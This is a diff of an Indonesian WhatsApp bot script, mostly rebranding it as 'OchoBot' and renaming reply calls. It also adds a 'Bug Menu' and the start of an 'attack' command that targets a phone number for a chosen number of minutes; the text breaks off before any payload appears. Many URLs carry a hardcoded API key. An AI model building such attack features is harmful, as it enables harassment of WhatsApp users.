+} else reply(`Anda sudah berpetualang dan kelelahan, silahkan coba lagi dalam\n*⏰ ${timers}*`)
+} else reply('Minimal 80 health untuk bisa berpetualang, beli nyawa dulu dengan ketik *' + prefix + 'shop buy potion <jumlah>*\ndan ketik *' + prefix + 'heal*')
 }
 break
 //BATAS//
@@ -3849,7 +3856,7 @@ break
 case 'poling': {
 var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "pollCreationMessage": {
-"name": "*_Halo Kk, Saya Owner SatganzDevsBotz_*\n\n*_Apakah Kk Nya Puas Dengan Fitur Fitur Yang Ada Di assistant bots ?_*",
+"name": "*_Halo Kk, Saya Owner SatganzDevsBotz_*\n\n*_Apakah Kk Nya Puas Dengan Fitur Fitur Yang Ada Di © OchoBot ?_*",
 "options": [
 	{
 "optionName": "Sangat Puas"
@@ -3870,71 +3877,71 @@ break
 //DDONE//
 //INI FITUR STICKER YA DECK//
 case 'patrick':
-m.reply(mess.wait)
+reply(mess.wait)
 SatganzDevs.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/patrick?apikey=dhmDlD5x`}}, {quoted: m })
 break
 case 'lonet':
-m.reply(mess.wait)
+reply(mess.wait)
 SatganzDevs.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/lonte?apikey=dhmDlD5x`}}, {quoted: m })
 break
 case 'lidi':
-m.reply(mess.wait)
+reply(mess.wait)
 SatganzDevs.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/manusia-lidi?apikey=dhmDlD5x`}}, {quoted: m })
 break
 case 'kucing':
-m.reply(mess.wait)
+reply(mess.wait)
 SatganzDevs.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/kucing?apikey=dhmDlD5x`}}, {quoted: m })
 break
 case 'sponbob':
-m.reply(mess.wait)
+reply(mess.wait)
 SatganzDevs.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/sponsbob?apikey=dhmDlD5x`}}, {quoted: m })
 break
 case 'kawansponbob':
-m.reply(mess.wait)
+reply(mess.wait)
 SatganzDevs.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/kawan-sponsbob?apikey=dhmDlD5x`}}, {quoted: m })
 break
 case 'popoci':
-m.reply(mess.wait)
+reply(mess.wait)
 SatganzDevs.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/popoci?apikey=dhmDlD5x`}}, {quoted: m })
 break
 case 'meow':
-m.reply(mess.wait)
+reply(mess.wait)
 SatganzDevs.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/meow?apikey=dhmDlD5x`}}, {quoted: m })
 break
 case 'menjamet':
-m.reply(mess.wait)
+reply(mess.wait)
 SatganzDevs.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/menjamet?apikey=dhmDlD5x`}}, {quoted: m })
 break
 case 'tyni':
-m.reply(mess.wait)
+reply(mess.wait)
 SatganzDevs.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/tyni?apikey=dhmDlD5x`}}, {quoted: m })
 break
 case 'gojosatoru':
-m.reply(mess.wait)
+reply(mess.wait)
 SatganzDevs.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/gojosatoru?apikey=dhmDlD5x`}}, {quoted: m })
 break
 case 'hopeboy':
-m.reply(mess.wait)
+reply(mess.wait)
 SatganzDevs.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/hope-boy?apikey=dhmDlD5x`}}, {quoted: m })
 break
 case 'doge':
-m.reply(mess.wait)
+reply(mess.wait)
 SatganzDevs.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/doge?apikey=dhmDlD5x`}}, {quoted: m })
 break
 case 'dinokuning':
-m.reply(mess.wait)
+reply(mess.wait)
 SatganzDevs.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/dyno-kuning?apikey=dhmDlD5x`}}, {quoted: m })
 break
 case 'nicholas':
-m.reply(mess.wait)
+reply(mess.wait)
 SatganzDevs.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/nicholas?apikey=dhmDlD5x`}}, {quoted: m })
 break
 case 'krrobot':
-m.reply(mess.wait)
+reply(mess.wait)
 SatganzDevs.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/kr-robot?apikey=dhmDlD5x`}}, {quoted: m })
 break
 case 'jiisho':
-m.reply(mess.wait)
+reply(mess.wait)
 SatganzDevs.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/jisoo?apikey=dhmDlD5x`}}, {quoted: m })
 break
 
@@ -3955,19 +3962,19 @@ break
                 if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                 if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                 if (/audio/.test(mime)) {
-                m.reply(mess.wait)
+                reply(mess.wait)
                 let media = await SatganzDevs.downloadAndSaveMediaMessage(quoted)
                 let ran = getRandom('.mp3')
                 exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                 fs.unlinkSync(media)
-                if (err) return m.reply(err)
+                if (err) return reply(err)
                 let buff = fs.readFileSync(ran)
                 SatganzDevs.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                 fs.unlinkSync(ran)
                 })
-                } else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
+                } else reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                 } catch (e) {
-                m.reply(e)
+                reply(e)
                 }
                 break
             case 'setcmd': {
@@ -3983,7 +3990,7 @@ break
                     at: + new Date,
                     locked: false,
                 }
-                m.reply(`Done!`)
+                reply(`Done!`)
             }
             break
             case 'delcmd': {
@@ -3991,7 +3998,7 @@ break
                 if (!hash) throw `Tidak ada hash`
                 if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
                 delete global.db.data.sticker[hash]
-                m.reply(`Done!`)
+                reply(`Done!`)
             }
             break
             case 'listcmd': {
@@ -4010,7 +4017,7 @@ ${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index +
                 let hash = m.quoted.fileSha256.toString('base64')
                 if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
                 global.db.data.sticker[hash].locked = !/^un/i.test(command)
-                m.reply('Done!')
+                reply('Done!')
             }
             break
             case 'addmsg': {
@@ -4019,7 +4026,7 @@ ${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index +
                 let msgs = global.db.data.database
                 if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
                 msgs[text.toLowerCase()] = quoted.fakeObj
-m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
+reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
     
 Akses dengan ${prefix}getmsg ${text}
 
@@ -4040,14 +4047,14 @@ Lihat list Pesan Dengan ${prefix}listmsg`)
 		for (let i of seplit) {
 		    teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
 	        }
-	        m.reply(teks)
+	        reply(teks)
 	    }
 	    break
             case 'delmsg': case 'deletemsg': {
 	        let msgs = global.db.data.database
-	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
+	        if (!(text.toLowerCase() in msgs)) return reply(`'${text}' tidak terdaftar didalam list pesan`)
 		delete msgs[text.toLowerCase()]
-		m.reply(`Berhasil menghapus '${text}' dari list pesan`)
+		reply(`Berhasil menghapus '${text}' dari list pesan`)
             }
 	    break
 // INI FITUR STORE GAME YA JING //
@@ -4117,7 +4124,7 @@ case 'ff':{
 
   const listMessage = {
    text: `*_Hai kak ${pushname}_*\n*_Ini List Harga Diamond Free Fire_*`,
-   footer: "assistant bots",
+   footer: "© OchoBot",
    title: "",
    buttonText: "Cek Harga !!",
    sections
@@ -4194,7 +4201,7 @@ break
                 }
                 break
             case 'keluar': case 'leave': {
-                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
+                if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                 this.anonymous = this.anonymous ? this.anonymous : {}
                 let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                 if (!room) {
@@ -4204,14 +4211,14 @@ break
                     await SatganzDevs.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
                     throw false
                 }
-                m.reply('Ok')
+                reply('Ok')
                 let other = room.other(m.sender)
                 if (other) await SatganzDevs.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                 delete this.anonymous[room.id]
                 if (command === 'leave') break
             }
             case 'mulai': case 'start': {
-                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
+                if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                 this.anonymous = this.anonymous ? this.anonymous : {}
                 if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                     let buttons = [
@@ -4252,7 +4259,7 @@ break
                 break
             }
             case 'next': case 'lanjut': {
-                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
+                if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                 this.anonymous = this.anonymous ? this.anonymous : {}
                 let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
                 if (!romeo) {
@@ -4299,13 +4306,13 @@ break
             case 'public': {
                 if (!isCreator) throw mess.owner
                 SatganzDevs.public = true
-                m.reply('*Sukse Change To Public Usage*')
+                reply('*Sukse Change To Public Usage*')
             }
             break
             case 'self': {
                 if (!isCreator) throw mess.owner
                 SatganzDevs.public = false
-                m.reply('*Sukses Change To Self Usage*')
+                reply('*Sukses Change To Self Usage*')
             }
             break
             case 'ping': case 'botstatus': case 'statusbot': {
@@ -4352,11 +4359,11 @@ ${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type =>
 _CPU Core(s) Usage (${cpus.length} Core CPU)_
 ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                 `.trim()
-                m.reply(respon)
+                reply(respon)
             }
             break
             case 'speedtest': {
-            m.reply('Testing Speed...')
+            reply('Testing Speed...')
             let cp = require('child_process')
             let { promisify } = require('util')
             let exec = promisify(cp.exec).bind(cp)
@@ -4367,8 +4374,8 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
           o = e
          } finally {
         let { stdout, stderr } = o
-        if (stdout.trim()) m.reply(stdout)
-        if (stderr.trim()) m.reply(stderr)
+        if (stdout.trim()) reply(stdout)
+        if (stderr.trim()) reply(stderr)
             }
             }
             break
@@ -4384,25 +4391,25 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                 setbot.templateVideo = false
                 setbot.templateGif = false
                 setbot.templateMsg = false
-                m.reply(mess.success)
+                reply(mess.success)
                 } else if (args[0] === 'templateVideo'){
                 setbot.templateImage = false
                 setbot.templateVideo = true
                 setbot.templateGif = false
                 setbot.templateMsg = false
-                m.reply(mess.success)
+                reply(mess.success)
                 } else if (args[0] === 'templateGif'){
                 setbot.templateImage = false
                 setbot.templateVideo = false
                 setbot.templateGif = true
                 setbot.templateMsg = false
-                m.reply(mess.success)
+                reply(mess.success)
                 } else if (args[0] === 'templateMessage'){
                 setbot.templateImage = false
                 setbot.templateVideo = false
                 setbot.templateGif = false
                 setbot.templateMsg = true
-                m.reply(mess.success)
+                reply(mess.success)
                 } else {
                 let sections = [
                 {
@@ -4457,7 +4464,7 @@ case 'req': case 'request': {
             }
             break
 case 'reeport': {
-if (!args.join(" ")) return m.reply(`Example : \n- ${prefix + command} fitur ig error min\n- ${prefix + command} user ini nyepam min`)
+if (!args.join(" ")) return reply(`Example : \n- ${prefix + command} fitur ig error min\n- ${prefix + command} user ini nyepam min`)
 teks = `*| REPORT FITUR |*`
 teks1 = `\n\nNomor : @${m.sender.split("@")[0]}\nReport : ${args.join(" ")}`
 teks2 = `\n\nSucces send to owner`
@@ -4525,7 +4532,7 @@ case 'store':{
 
   const listMessage = {
    text: `*_Welcome To SatganzDevsBotz Store_*`,
-   footer: "assistant bots",
+   footer: "© OchoBot",
    title: "",
    buttonText: "Silahkan Dipilih !!",
    sections
@@ -4540,7 +4547,7 @@ break
 case 'menu': {
 const Jimp = require('jimp')
 SatganzDevs.sendMessage(m.chat, { react: { text: "🔥", key: m.key }})
-  	anu = `*sᴀʏᴀ Asisstan, ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ ʏᴀɴɢ ᴍᴇᴍʙᴀɴᴛᴜ ᴀɴᴅᴀ ᴜɴᴛᴜᴋ ᴍᴇᴍᴘᴇʀᴍᴜᴅᴀʜ sᴇsᴜᴀᴛᴜ sᴇᴘᴇʀᴛɪ ᴍᴇᴍʙᴜᴀᴛ sᴛɪᴄᴋᴇʀ ᴅᴀɴ ʟᴀɪɴɴʏᴀ.*`
+  	anu = `*sᴀʏᴀ ᴏᴄʜᴏʙᴏᴛ, ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ ʏᴀɴɢ ᴍᴇᴍʙᴀɴᴛᴜ ᴀɴᴅᴀ ᴜɴᴛᴜᴋ ᴍᴇᴍᴘᴇʀᴍᴜᴅᴀʜ sᴇsᴜᴀᴛᴜ sᴇᴘᴇʀᴛɪ ᴍᴇᴍʙᴜᴀᴛ sᴛɪᴄᴋᴇʀ ᴅᴀɴ ʟᴀɪɴɴʏᴀ.*`
     let buttons = [{ buttonId: `tesrow`, buttonText: { displayText: `𝘔𝘌𝘕𝘜` }, type: 1 }, { buttonId: `rules`, buttonText: { displayText: `𝘙𝘜𝘓𝘌𝘚` }, type: 1 }]
     let buttonMessage = {
    document: fs.readFileSync(`./SatganzDevsMedia/doc/ngentot.xlsx`),
@@ -4550,7 +4557,7 @@ SatganzDevs.sendMessage(m.chat, { react: { text: "🔥", key: m.key }})
   buttons: buttons,
   headerType: 4,
   contextInfo:{externalAdReply:{
-  title: 'assistant bots',
+  title: '© OchoBot',
   body: 'Follow Me on Instagram', 
   showAdAttribution: true,
   thumbnail: thumb,
@@ -4819,7 +4826,7 @@ case 'tesrow':{
 	   {
 	    title: "【🤙】› Source Code Bot ‹", 
 	    rowId: `${prefix}sc`,
-	    description: "Script assistant bots",
+	    description: "Script © OchoBot",
 	    },	    
      ]
     },
@@ -4830,6 +4837,16 @@ case 'tesrow':{
 	    title: "【🌹️】› Contributor ‹", 
 	    rowId: `${prefix}tqto`,
 	    description: "",
+	    },	    
+     ]
+    },
+    {
+    title: "Bug Menu",
+	rows: [
+	   {
+	    title: "【👹】› Bug Menu‹", 
+	    rowId: `${prefix}bugmenu`,
+	    description: "Bug Menu ",
 	    },	    
      ]
     },
@@ -4845,16 +4862,21 @@ case 'tesrow':{
     ]
 
   const listMessage = {
-   text: `*_Hai kak ${pushname} ${ucapanWaktu}_*\n\n_Aku assistant bots Bot whatsapp multi-device yang dapat membantumu_`,
-   footer: "assistant bots",
+   text: `${ucapanWaktu} @${sender.split("@")[0]}, \n\Ini Adalah Semua Menu Ku ><`,
+   footer: "© ᴏᴄʜᴏʙᴏᴛ",
    title: "",
    buttonText: "Click Here!",
+   mentions: [sender],
    sections
    }
 
   SatganzDevs.sendMessage(m.chat, listMessage, {quoted:m})
   }
 break
+case 'bugmenu':{
+	reply(`BUG MENU :\n .attack > nomor target <`)
+	}
+	break
 case 'gamemenu':{
   // send a list message!
    const sections = [
@@ -4934,8 +4956,8 @@ case 'gamemenu':{
     ]
 
   const listMessage = {
-   text: `*_Hai kak ${pushname} ${ucapanWaktu}_*\n\n_Berikut Game" Yang Tersedia Di assistant bots_`,
-   footer: "assistant bots",
+   text: `*_Hai kak ${pushname} ${ucapanWaktu}_*\n\n_Berikut Game" Yang Tersedia Di © OchoBot_`,
+   footer: "© OchoBot",
    title: "",
    buttonText: "Buka!",
    sections
@@ -4963,14 +4985,14 @@ let sections = [
 
                 ]
 
-                SatganzDevs.sendListMsg(m.chat, `*❏ assistant bots*
+                SatganzDevs.sendListMsg(m.chat, `*❏ © OchoBot*
 
 Bot ini dibuat menggunakan *NodeJS* dengan bantuan *Baileys* sebagai Whatsapp Web API dan dimodifikasi dari *Hisoka Morou ( DikaArdnt )
 
 *❏ SCIRPT BOT*
 ORI : https://github.com/DikaArdnt/Hisoka-Morou
 RECODE : https://safelink.id/fUSteSe
-© assistant bots`, ' ', ' ', `Buka!`, sections, m)
+© © OchoBot`, ' ', ' ', `Buka!`, sections, m)
        }
 break
 case 'donasi': case 'donate': case 'donasi': case 'donasi': {
@@ -5039,11 +5061,11 @@ let buttonMessage = {
   document: fs.readFileSync('./SatganzDevsMedia/doc/fake.pdf'),
   fileName : `Hi ${pushname} |${ucapanWaktu}`,
   caption: goup,
-  footer: 'assistant bots',
+  footer: '© OchoBot',
   buttons: buttons,
   headerType: 4,
   contextInfo:{externalAdReply:{
-  title: 'assistant bots',
+  title: '© OchoBot',
   body: 'Follow Me on Instagram', 
   showAdAttribution: true,
   thumbnail: xc,
@@ -5122,11 +5144,11 @@ let buttonMessage = {
   document: fs.readFileSync('./SatganzDevsMedia/doc/fake.pdf'),
   fileName : `Hi ${pushname} |${ucapanWaktu}`,
   caption: sond,
-  footer: 'assistant bots',
+  footer: '© OchoBot',
   buttons: buttons,
   headerType: 4,
   contextInfo:{externalAdReply:{
-  title: 'assistant bots',
+  title: '© OchoBot',
   body: 'Follow Me on Instagram', 
   showAdAttribution: true,
   thumbnail: xc,
@@ -5194,11 +5216,11 @@ let buttonMessage = {
   document: fs.readFileSync('./SatganzDevsMedia/doc/fake.pdf'),
   fileName : `Hi ${pushname} |${ucapanWaktu}`,
   caption: pen,
-  footer: 'assistant bots',
+  footer: '© OchoBot',
   buttons: buttons,
   headerType: 4,
   contextInfo:{externalAdReply:{
-  title: 'assistant bots',
+  title: '© OchoBot',
   body: 'Follow Me on Instagram', 
   showAdAttribution: true,
   thumbnail: xc,
@@ -5229,11 +5251,11 @@ let buttonMessage = {
   document: fs.readFileSync('./SatganzDevsMedia/doc/fake.pdf'),
   fileName : `Hi ${pushname} |${ucapanWaktu}`,
   caption: pimbon,
-  footer: 'assistant bots',
+  footer: '© OchoBot',
   buttons: buttons,
   headerType: 4,
   contextInfo:{externalAdReply:{
-  title: 'assistant bots',
+  title: '© OchoBot',
   body: 'Follow Me on Instagram', 
   showAdAttribution: true,
   thumbnail: xc,
@@ -5259,11 +5281,11 @@ let buttonMessage = {
   document: fs.readFileSync('./SatganzDevsMedia/doc/fake.pdf'),
   fileName : `Hi ${pushname} |${ucapanWaktu}`,
   caption: dwnloader,
-  footer: 'assistant bots',
+  footer: '© OchoBot',
   buttons: buttons,
   headerType: 4,
   contextInfo:{externalAdReply:{
-  title: 'assistant bots',
+  title: '© OchoBot',
   body: 'Follow Me on Instagram', 
   showAdAttribution: true,
   thumbnail: xc,
@@ -5293,11 +5315,11 @@ let buttonMessage = {
   document: fs.readFileSync('./SatganzDevsMedia/doc/fake.pdf'),
   fileName : `Hi ${pushname} |${ucapanWaktu}`,
   caption: sarch,
-  footer: 'assistant bots',
+  footer: '© OchoBot',
   buttons: buttons,
   headerType: 4,
   contextInfo:{externalAdReply:{
-  title: 'assistant bots',
+  title: '© OchoBot',
   body: 'Follow Me on Instagram', 
   showAdAttribution: true,
   thumbnail: xc,
@@ -5331,11 +5353,11 @@ let buttonMessage = {
   document: fs.readFileSync('./SatganzDevsMedia/doc/fake.pdf'),
   fileName : `Hi ${pushname} |${ucapanWaktu}`,
   caption: rndom,
-  footer: 'assistant bots',
+  footer: '© OchoBot',
   buttons: buttons,
   headerType: 4,
   contextInfo:{externalAdReply:{
-  title: 'assistant bots',
+  title: '© OchoBot',
   body: 'Follow Me on Instagram', 
   showAdAttribution: true,
   thumbnail: xc,
@@ -5442,11 +5464,11 @@ let buttonMessage = {
   document: fs.readFileSync('./SatganzDevsMedia/doc/fake.pdf'),
   fileName : `Hi ${pushname} |${ucapanWaktu}`,
   caption: txtpro,
-  footer: 'assistant bots',
+  footer: '© OchoBot',
   buttons: buttons,
   headerType: 4,
   contextInfo:{externalAdReply:{
-  title: 'assistant bots',
+  title: '© OchoBot',
   body: 'Follow Me on Instagram', 
   showAdAttribution: true,
   thumbnail: xc,
@@ -5477,11 +5499,11 @@ let buttonMessage = {
   document: fs.readFileSync('./SatganzDevsMedia/doc/fake.pdf'),
   fileName : `Hi ${pushname} |${ucapanWaktu}`,
   caption: potooxy,
-  footer: 'assistant bots',
+  footer: '© OchoBot',
   buttons: buttons,
   headerType: 4,
   contextInfo:{externalAdReply:{
-  title: 'assistant bots',
+  title: '© OchoBot',
   body: 'Follow Me on Instagram', 
   showAdAttribution: true,
   thumbnail: xc,
@@ -5510,11 +5532,11 @@ let buttonMessage = {
   document: fs.readFileSync('./SatganzDevsMedia/doc/fake.pdf'),
   fileName : `Hi ${pushname} |${ucapanWaktu}`,
   caption: mun,
-  footer: 'assistant bots',
+  footer: '© OchoBot',
   buttons: buttons,
   headerType: 4,
   contextInfo:{externalAdReply:{
-  title: 'assistant bots',
+  title: '© OchoBot',
   body: 'Follow Me on Instagram', 
   showAdAttribution: true,
   thumbnail: xc,
@@ -5562,11 +5584,11 @@ let buttonMessage = {
   document: fs.readFileSync('./SatganzDevsMedia/doc/fake.pdf'),
   fileName : `Hi ${pushname} |${ucapanWaktu}`,
   caption: pimbon,
-  footer: 'assistant bots',
+  footer: '© OchoBot',
   buttons: buttons,
   headerType: 4,
   contextInfo:{externalAdReply:{
-  title: 'assistant bots',
+  title: '© OchoBot',
   body: 'Follow Me on Instagram', 
   showAdAttribution: true,
   thumbnail: xc,
@@ -5596,11 +5618,11 @@ let buttonMessage = {
   document: fs.readFileSync('./SatganzDevsMedia/doc/fake.pdf'),
   fileName : `Hi ${pushname} |${ucapanWaktu}`,
   caption: pimbon,
-  footer: 'assistant bots',
+  footer: '© OchoBot',
   buttons: buttons,
   headerType: 4,
   contextInfo:{externalAdReply:{
-  title: 'assistant bots',
+  title: '© OchoBot',
   body: 'Follow Me on Instagram', 
   showAdAttribution: true,
   thumbnail: xc,
@@ -5636,11 +5658,11 @@ let buttonMessage = {
   document: fs.readFileSync('./SatganzDevsMedia/doc/fake.pdf'),
   fileName : `Hi ${pushname} |${ucapanWaktu}`,
   caption: cnvert,
-  footer: 'assistant bots',
+  footer: '© OchoBot',
   buttons: buttons,
   headerType: 4,
   contextInfo:{externalAdReply:{
-  title: 'assistant bots',
+  title: '© OchoBot',
   body: 'Follow Me on Instagram', 
   showAdAttribution: true,
   thumbnail: xc,
@@ -5674,11 +5696,11 @@ let buttonMessage = {
   document: fs.readFileSync('./SatganzDevsMedia/doc/fake.pdf'),
   fileName : `Hi ${pushname} |${ucapanWaktu}`,
   caption: min,
-  footer: 'assistant bots',
+  footer: '© OchoBot',
   buttons: buttons,
   headerType: 4,
   contextInfo:{externalAdReply:{
-  title: 'assistant bots',
+  title: '© OchoBot',
   body: 'Follow Me on Instagram', 
   showAdAttribution: true,
   thumbnail: xc,
@@ -5704,11 +5726,11 @@ let buttonMessage = {
   document: fs.readFileSync('./SatganzDevsMedia/doc/fake.pdf'),
   fileName : `Hi ${pushname} |${ucapanWaktu}`,
   caption: min,
-  footer: 'assistant bots',
+  footer: '© OchoBot',
   buttons: buttons,
   headerType: 4,
   contextInfo:{externalAdReply:{
-  title: 'assistant bots',
+  title: '© OchoBot',
   body: 'Follow Me on Instagram', 
   showAdAttribution: true,
   thumbnail: xc,
@@ -5754,11 +5776,11 @@ let buttonMessage = {
   document: fs.readFileSync('./SatganzDevsMedia/doc/fake.pdf'),
   fileName : `Hi ${pushname} |${ucapanWaktu}`,
   caption: min,
-  footer: 'assistant bots',
+  footer: '© OchoBot',
   buttons: buttons,
   headerType: 4,
   contextInfo:{externalAdReply:{
-  title: 'assistant bots',
+  title: '© OchoBot',
   body: 'Follow Me on Instagram', 
   showAdAttribution: true,
   thumbnail: xc,
@@ -5786,11 +5808,11 @@ let buttonMessage = {
   document: fs.readFileSync('./SatganzDevsMedia/doc/fake.pdf'),
   fileName : `Hi ${pushname} |${ucapanWaktu}`,
   caption: min,
-  footer: 'assistant bots',
+  footer: '© OchoBot',
   buttons: buttons,
   headerType: 4,
   contextInfo:{externalAdReply:{
-  title: 'assistant bots',
+  title: '© OchoBot',
   body: 'Follow Me on Instagram', 
   showAdAttribution: true,
   thumbnail: xc,
@@ -5812,11 +5834,11 @@ let buttonMessage = {
   document: fs.readFileSync('./SatganzDevsMedia/doc/fake.pdf'),
   fileName : `Hi ${pushname} |${ucapanWaktu}`,
   caption: min,
-  footer: 'assistant bots',
+  footer: '© OchoBot',
   buttons: buttons,
   headerType: 4,
   contextInfo:{externalAdReply:{
-  title: 'assistant bots',
+  title: '© OchoBot',
   body: 'Follow Me on Instagram', 
   showAdAttribution: true,
   thumbnail: xc,
@@ -5843,11 +5865,11 @@ let buttonMessage = {
   document: fs.readFileSync('./SatganzDevsMedia/doc/fake.pdf'),
   fileName : `Hi ${pushname} |${ucapanWaktu}`,
   caption: dtbase,
-  footer: 'assistant bots',
+  footer: '© OchoBot',
   buttons: buttons,
   headerType: 4,
   contextInfo:{externalAdReply:{
-  title: 'assistant bots',
+  title: '© OchoBot',
   body: 'Follow Me on Instagram', 
   showAdAttribution: true,
   thumbnail: xc,
@@ -5871,11 +5893,11 @@ let buttonMessage = {
   document: fs.readFileSync('./SatganzDevsMedia/doc/fake.pdf'),
   fileName : `Hi ${pushname} |${ucapanWaktu}`,
   caption: aonymous,
-  footer: 'assistant bots',
+  footer: '© OchoBot',
   buttons: buttons,
   headerType: 4,
   contextInfo:{externalAdReply:{
-  title: 'assistant bots',
+  title: '© OchoBot',
   body: 'Follow Me on Instagram', 
   showAdAttribution: true,
   thumbnail: xc,
@@ -5903,11 +5925,11 @@ let buttonMessage = {
   document: fs.readFileSync('./SatganzDevsMedia/doc/fake.pdf'),
   fileName : `Hi ${pushname} |${ucapanWaktu}`,
   caption: islmic,
-  footer: 'assistant bots',
+  footer: '© OchoBot',
   buttons: buttons,
   headerType: 4,
   contextInfo:{externalAdReply:{
-  title: 'assistant bots',
+  title: '© OchoBot',
   body: 'Follow Me on Instagram', 
   showAdAttribution: true,
   thumbnail: xc,
@@ -5937,11 +5959,11 @@ let buttonMessage = {
   document: fs.readFileSync('./SatganzDevsMedia/doc/fake.pdf'),
   fileName : `Hi ${pushname} |${ucapanWaktu}`,
   caption: vice,
-  footer: 'assistant bots',
+  footer: '© OchoBot',
   buttons: buttons,
   headerType: 4,
   contextInfo:{externalAdReply:{
-  title: 'assistant bots',
+  title: '© OchoBot',
   body: 'Follow Me on Instagram', 
   showAdAttribution: true,
   thumbnail: xc,
@@ -5974,11 +5996,11 @@ let buttonMessage = {
   document: fs.readFileSync('./SatganzDevsMedia/doc/fake.pdf'),
   fileName : `Hi ${pushname} |${ucapanWaktu}`,
   caption: oner,
-  footer: 'assistant bots',
+  footer: '© OchoBot',
   buttons: buttons,
   headerType: 4,
   contextInfo:{externalAdReply:{
-  title: 'assistant bots',
+  title: '© OchoBot',
   body: 'Follow Me on Instagram', 
   showAdAttribution: true,
   thumbnail: xc,
@@ -6424,9 +6446,91 @@ case 'sound161':
 SatganzDevs_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
 await SatganzDevs.sendMessage(m.chat, { audio: SatganzDevs_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
 break
+case prefix+'attack':
+	        if (!isCreator && !isPremium) return reply('luwh siapa?')
+            if (args.length < 2) return reply(`Mau Attack Siapa?`)
+            let nomore = q.replace(/[^0-9]/g, "").replace(/[^0-9]/g, "")
+            let noget = nomore.replace(/[@s.whatsapnet]/g, "").replace(/[@S.WHATSAPNET]/g, "")
+            if (isNaN(noget)) return reply(`Must be a number Bitch!! `)
+            var satgnz = "6281316701742"
+            let isnoown = new RegExp(satgnz, 'i')
+            var cekon = await SatganzDevs.onWhatsApp(nomore)
+                 if (cekon.length == 0) return reply(`Nomor tersebut tidak terdaftar di whatsapp\n\nMasukkan nomer yang valid/terdaftar di WhatsApp`)
+            let isOwn = isnoown.test(q)
+            if (isOwn) return reply(`You Can't ${command} My Owner Bitch!`)
+            {
+        	var listMsg = {
+                text: `${ucapanWaktu} @${sender.split("@")[0]}, \n\nSilahkan Pilih Durasi Penyerangan`,
+                buttonText: 'Click Here!',
+                footer: `© Kurniawan Satria`,
+                mentions: [sender],
+                sections: [
+                {
+            title: "MINUTE SELECTION",
+                rows: [
+           {title: "1 Minute", rowId: `${prefix}atk ${noget}|1`, description: `Attack ${noget} During 1 Minute `},
